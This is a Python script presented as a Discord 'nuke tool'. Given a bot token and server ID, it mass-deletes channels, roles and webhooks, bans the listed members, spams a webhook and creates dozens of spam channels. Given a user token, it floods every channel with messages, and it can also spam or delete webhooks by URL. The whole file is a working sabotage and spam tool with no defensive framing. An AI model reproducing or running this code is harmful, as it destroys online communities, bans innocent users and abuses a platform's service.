import requests
import time
import os
import threading
from pystyle import Colors, Colorate, Center
from concurrent.futures import ThreadPoolExecutor

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

logo = """
 ╔═════ ╔═════╗ ╔═════╗ ╔═════╗ ╔═════╗ ╔═════╗
 ║ ╔═══ ║  _  ║ ║  _  ║ ║  _  ║   ║     ║ ╔═══╝
 ║ ╚══╗ ║ █ █ ║ ║ ║ ║ ║ ║ ║ ║ ║   ║     ║ ║  _ 
 ║ ╔══╝ ║ █ █ ║ ║ ║ ║ ║ ║ ║ ║ ║   ║     ║ ║ █ ║
 ║ ╚═══ ║ █ █ ║ ║ █ █ ║ ║ █ █ ║   ║     ║ ╚══ ║
 ╚═════ ╚═════╝ ╚═════╝ ╚═════╝   ╚═╝   ╚═════╝
            EROOTG NUKE TOOL v2.0
"""

stop_flag = False

def banner():
    clear()
    print(Colorate.Horizontal(Colors.red_to_purple, logo, 1))
    print(Colorate.Horizontal(Colors.cyan_to_blue, "="*50, 1))
    print()

def get_token():
    return input(Colorate.Color(Colors.cyan, "[>] Token: ", 1) + Colorate.Color(Colors.white, "", 1)).strip()

def get_guild():
    return input(Colorate.Color(Colors.cyan, "[>] Server ID: ", 1) + Colorate.Color(Colors.white, "", 1)).strip()

def get_message():
    return input(Colorate.Color(Colors.cyan, "[>] Spam Message: ", 1) + Colorate.Color(Colors.white, "", 1)).strip()

def get_count():
    return int(input(Colorate.Color(Colors.cyan, "[>] Number of messages (0 = infinite): ", 1) + Colorate.Color(Colors.white, "", 1)).strip())

def get_delay():
    return float(input(Colorate.Color(Colors.cyan, "[>] Delay between messages (seconds): ", 1) + Colorate.Color(Colors.white, "", 1)).strip())

def get_webhook():
    url = input(Colorate.Color(Colors.cyan, "[>] Webhook URL (skip: Enter): ", 1) + Colorate.Color(Colors.white, "", 1)).strip()
    return url if url else None

def headers(token):
    return {"Authorization": token, "Content-Type": "application/json"}

def get_channels(gid, token):
    r = requests.get(f"https://discord.com/api/v10/guilds/{gid}/channels", headers=headers(token))
    return [c for c in r.json() if c["type"] in [0,2,5]] if r.status_code == 200 else []

def get_roles(gid, token):
    r = requests.get(f"https://discord.com/api/v10/guilds/{gid}/roles", headers=headers(token))
    return [role["id"] for role in r.json() if role["id"] != gid] if r.status_code == 200 else []

def get_members(gid, token):
    r = requests.get(f"https://discord.com/api/v10/guilds/{gid}/members?limit=1000", headers=headers(token))
    return [m["user"]["id"] for m in r.json()] if r.status_code == 200 else []

def get_webhooks(gid, token):
    r = requests.get(f"https://discord.com/api/v10/guilds/{gid}/webhooks", headers=headers(token))
    return [w["id"] for w in r.json()] if r.status_code == 200 else []

def del_channel(cid, token):
    r = requests.delete(f"https://discord.com/api/v10/channels/{cid}", headers=headers(token))
    return r.status_code in [200,204]

def del_role(rid, gid, token):
    r = requests.delete(f"https://discord.com/api/v10/guilds/{gid}/roles/{rid}", headers=headers(token))
    return r.status_code in [200,204]

def ban_member(mid, gid, token):
    r = requests.put(f"https://discord.com/api/v10/guilds/{gid}/bans/{mid}", headers=headers(token))
    return r.status_code in [200,204]

def del_webhook(wid, token):
    r = requests.delete(f"https://discord.com/api/v10/webhooks/{wid}", headers=headers(token))
    return r.status_code in [200,204]

def create_channel(gid, token, name):
    r = requests.post(f"https://discord.com/api/v10/guilds/{gid}/channels", headers=headers(token), json={"name": name, "type": 0})
    return r.status_code == 201

def send_message(cid, token, msg):
    try:
        r = requests.post(f"https://discord.com/api/v10/channels/{cid}/messages", headers=headers(token), json={"content": msg})
        return r.status_code == 200
    except:
        return False

def spam_webhook(url, msg, count, delay):
    global stop_flag
    stop_flag = False
    success = 0
    total = count if count > 0 else float('inf')
    i = 0
    while i < total and not stop_flag:
        try:
            r = requests.post(url, json={"content": msg})
            if r.status_code == 204:
                success += 1
                print(Colorate.Color(Colors.green, f"[+] Sent {success}", 1))
            else:
                print(Colorate.Color(Colors.red, f"[-] Failed {i+1}", 1))
        except:
            print(Colorate.Color(Colors.red, f"[-] Error {i+1}", 1))
        i += 1
        if delay > 0 and i < total and not stop_flag:
            time.sleep(delay)
    return success

def spam_channels(gid, token, msg, count, delay):
    global stop_flag
    stop_flag = False
    chans = get_channels(gid, token)
    if not chans:
        print(Colorate.Color(Colors.red, "[-] No channels", 1))
        return
    
    print(Colorate.Color(Colors.green, f"[+] Found {len(chans)} channels", 1))
    print(Colorate.Color(Colors.yellow, "[>] Press ENTER to stop", 1))
    
    total = count if count > 0 else float('inf')
    sent = 0
    i = 0
    
    while i < total and not stop_flag:
        for c in chans:
            if stop_flag or i >= total:
                break
            if send_message(c["id"], token, msg):
                sent += 1
                print(Colorate.Color(Colors.green, f"[+] Sent {sent} total", 1))
            else:
                print(Colorate.Color(Colors.red, f"[-] Failed on channel {c['name']}", 1))
            i += 1
            if delay > 0 and not stop_flag:
                time.sleep(delay)
    
    if stop_flag:
        print(Colorate.Color(Colors.yellow, f"\n[!] Stopped. Sent {sent} messages", 1))
    else:
        print(Colorate.Color(Colors.green, f"[+] Done. Sent {sent} messages", 1))

def wait_for_stop():
    global stop_flag
    input()
    stop_flag = True
    print(Colorate.Color(Colors.yellow, "\n[!] Stopping...", 1))

def nuke_bot(gid, token, webhook_url):
    global stop_flag
    stop_flag = False
    threading.Thread(target=wait_for_stop, daemon=True).start()
    
    print(Colorate.Color(Colors.red, "\n[!] BOT NUKE STARTING", 1))
    print(Colorate.Color(Colors.yellow, "[>] Press ENTER to stop", 1))
    
    if not stop_flag:
        chans = get_channels(gid, token)
        with ThreadPoolExecutor(max_workers=20) as ex:
            done = sum(1 for f in ex.map(lambda c: del_channel(c["id"], token), chans) if f)
        print(Colorate.Color(Colors.green, f"[+] Deleted {done}/{len(chans)} channels", 1))
    
    if not stop_flag:
        roles = get_roles(gid, token)
        with ThreadPoolExecutor(max_workers=20) as ex:
            done = sum(1 for f in ex.map(lambda r: del_role(r, gid, token), roles) if f)
        print(Colorate.Color(Colors.green, f"[+] Deleted {done}/{len(roles)} roles", 1))
    
    if not stop_flag:
        members = get_members(gid, token)
        with ThreadPoolExecutor(max_workers=20) as ex:
            done = sum(1 for f in ex.map(lambda m: ban_member(m, gid, token), members) if f)
        print(Colorate.Color(Colors.green, f"[+] Banned {done}/{len(members)} members", 1))
    
    if not stop_flag:
        whs = get_webhooks(gid, token)
        with ThreadPoolExecutor(max_workers=20) as ex:
            done = sum(1 for f in ex.map(lambda w: del_webhook(w, token), whs) if f)
        print(Colorate.Color(Colors.green, f"[+] Deleted {done}/{len(whs)} webhooks", 1))
    
    if webhook_url and not stop_flag:
        print(Colorate.Color(Colors.yellow, "[>] Spamming webhook", 1))
        sent = spam_webhook(webhook_url, "EROTG", 500, 0.1)
        print(Colorate.Color(Colors.green, f"[+] Sent {sent}", 1))
    
    if not stop_flag:
        with ThreadPoolExecutor(max_workers=10) as ex:
            done = sum(1 for f in ex.map(lambda i: create_channel(gid, token, f"erootg-{i}"), range(50)) if f)
        print(Colorate.Color(Colors.green, f"[+] Created {done} spam channels", 1))
    
    if stop_flag:
        print(Colorate.Color(Colors.yellow, "[!] STOPPED", 1))
    else:
        print(Colorate.Color(Colors.red, "[+] BOT NUKE DONE", 1))

def nuke_user(gid, token, msg, count, delay):
    global stop_flag
    stop_flag = False
    threading.Thread(target=wait_for_stop, daemon=True).start()
    
    print(Colorate.Color(Colors.red, "\n[!] USER SPAM STARTING", 1))
    spam_channels(gid, token, msg, count, delay)

def main():
    while True:
        banner()
        print(Colorate.Color(Colors.cyan, "MENU", 1))
        print(Colorate.Color(Colors.yellow, "[1] NUKE (Bot Token)", 1))
        print(Colorate.Color(Colors.yellow, "[2] User Spam (User Token)", 1))
        print(Colorate.Color(Colors.yellow, "[3] Spam Webhook", 1))
        print(Colorate.Color(Colors.yellow, "[4] Delete Webhook", 1))
        print(Colorate.Color(Colors.yellow, "[5] Exit", 1))
        
        choice = input(Colorate.Color(Colors.cyan, "[>] Choose: ", 1) + Colorate.Color(Colors.white, "", 1)).strip()
        
        if choice == "1":
            banner()
            token = get_token()
            gid = get_guild()
            wh = get_webhook()
            confirm = input(Colorate.Color(Colors.red, "[!] Confirm (yes/no): ", 1) + Colorate.Color(Colors.white, "", 1))
            if confirm.lower() == "yes":
                nuke_bot(gid, token, wh)
            input(Colorate.Color(Colors.cyan, "[>] Enter to continue", 1))
        elif choice == "2":
            banner()
            token = get_token()
            gid = get_guild()
            msg = get_message()
            count = get_count()
            delay = get_delay()
            confirm = input(Colorate.Color(Colors.red, "[!] Confirm (yes/no): ", 1) + Colorate.Color(Colors.white, "", 1))
            if confirm.lower() == "yes":
                nuke_user(gid, token, msg, count, delay)
            input(Colorate.Color(Colors.cyan, "[>] Enter to continue", 1))
        elif choice == "3":
            banner()
            url = input(Colorate.Color(Colors.cyan, "[>] Webhook URL: ", 1) + Colorate.Color(Colors.white, "", 1))
            msg = input(Colorate.Color(Colors.cyan, "[>] Message: ", 1) + Colorate.Color(Colors.white, "", 1))
            count = int(input(Colorate.Color(Colors.cyan, "[>] Count (0=infinite): ", 1) + Colorate.Color(Colors.white, "", 1)))
            delay = float(input(Colorate.Color(Colors.cyan, "[>] Delay (seconds): ", 1) + Colorate.Color(Colors.white, "", 1)))
            sent = spam_webhook(url, msg, count, delay)
            print(Colorate.Color(Colors.green, f"[+] Sent {sent}", 1))
            input(Colorate.Color(Colors.cyan, "[>] Enter to continue", 1))
        elif choice == "4":
            banner()
            url = input(Colorate.Color(Colors.cyan, "[>] Webhook URL: ", 1) + Colorate.Color(Colors.white, "", 1))
            r = requests.delete(url)
            if r.status_code == 204:
                print(Colorate.Color(Colors.green, "[+] Deleted", 1))
            else:
                print(Colorate.Color(Colors.red, "[-] Failed", 1))
            input(Colorate.Color(Colors.cyan, "[>] Enter to continue", 1))
        elif choice == "5":
            break

if __name__ == "__main__":
    main()